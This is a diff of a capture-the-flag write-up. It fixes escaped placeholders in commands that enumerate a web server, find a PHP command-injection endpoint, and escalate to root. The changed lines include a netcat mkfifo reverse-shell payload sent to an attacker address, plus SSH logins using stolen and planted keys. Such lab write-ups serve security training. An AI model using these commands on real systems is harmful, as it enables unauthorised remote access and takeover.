@@ -26,13 +26,13 @@ The site is a static school page (About, Courses, Admissions, Contact). The cont
 I ran a directory scan:
 
 ``` bash  
-gobuster dir -u http://&lt;IP&gt;/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x js,html,php,txt  
+gobuster dir -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x js,html,php,txt  
 ```
 
 `/assets` showed up as a directory (301). Scanning inside it:
 
 ```bash  
-gobuster dir -u http://&lt;IP&gt;/assets/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x js,html,php,txt  
+gobuster dir -u http://<IP>/assets/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x js,html,php,txt  
 ```
 
 ```  
@@ -47,7 +47,7 @@ An `index.php` inside `/assets/` is odd — that folder usually holds CSS and im
 Curling it shows an empty body but a PHP session cookie:
 
 ```bash  
-curl -i http://&lt;IP&gt;/assets/index.php  
+curl -i http://<IP>/assets/index.php  
 ```
 
 ```  
@@ -59,7 +59,7 @@ Content-Length: 0
 So the script does something, it just needs the right input. My first attempts failed because I was fuzzing with a dummy value and a parameter-name wordlist. The script only reacts when the parameter's **value** is an actual command, and the parameter name lives in a plain words list. Fixing both:
 
 ```bash  
-ffuf -u 'http://&lt;IP&gt;/assets/index.php?FUZZ=id' \\  
+ffuf -u 'http://<IP>/assets/index.php?FUZZ=id' \\  
   -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt \\  
   -mc all -fs 0  
 ```
@@ -75,7 +75,7 @@ cmd \[Status: 200, Size: 72\]
 The parameter is `cmd`. The response comes back base64-encoded, so I decode it:
 
 ```bash  
-curl -s -G "http://&lt;IP&gt;/assets/index.php" --data-urlencode "cmd=id" | base64 -d  
+curl -s -G "http://<IP>/assets/index.php" --data-urlencode "cmd=id" | base64 -d  
 ```
 
 ```  
@@ -95,11 +95,11 @@ nc -lvnp 9999
 A `bash -i` payload didn't come back (the target's default shell wasn't cooperating), so I used the `nc mkfifo` payload instead. `curl --data-urlencode` handles the special characters so I don't have to URL-encode by hand:
 
 ```bash  
-curl -s -G "http://&lt;IP&gt;/assets/index.php" \\  
-  --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;MY_IP&gt; 9999 >/tmp/f"  
+curl -s -G "http://<IP>/assets/index.php" \\  
+  --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MY_IP> 9999 >/tmp/f"  
 ```
 
-The listener caught the shell as \`www-data\`. I stabilized it:
+The listener caught the shell as `\www-data\`. I stabilized it:
 
 ```bash  
 python3 -c 'import pty; pty.spawn("/bin/bash")'  
@@ -123,7 +123,7 @@ Once the header was repaired into a valid JPEG, the image opened. But nothing us
 it was stored on the target itself, in a readable file accessible from the www-data shell. Once I found it, steghide extract handed over deku's SSH credentials.
 
 ```bash  
-ssh deku@&lt;IP&gt;  
+ssh deku@<IP> 
 cat user.txt  
 ```
 
@@ -179,7 +179,7 @@ sudo /opt/NewComponent/feedback.sh
 With the key in place, I logged in as root:
 
 ```bash  
-ssh -i ~/highschool/root_key root@&lt;IP&gt;  
+ssh -i ~/highschool/root_key root@<IP>  
 cat /root/root.txt  
 ```
 
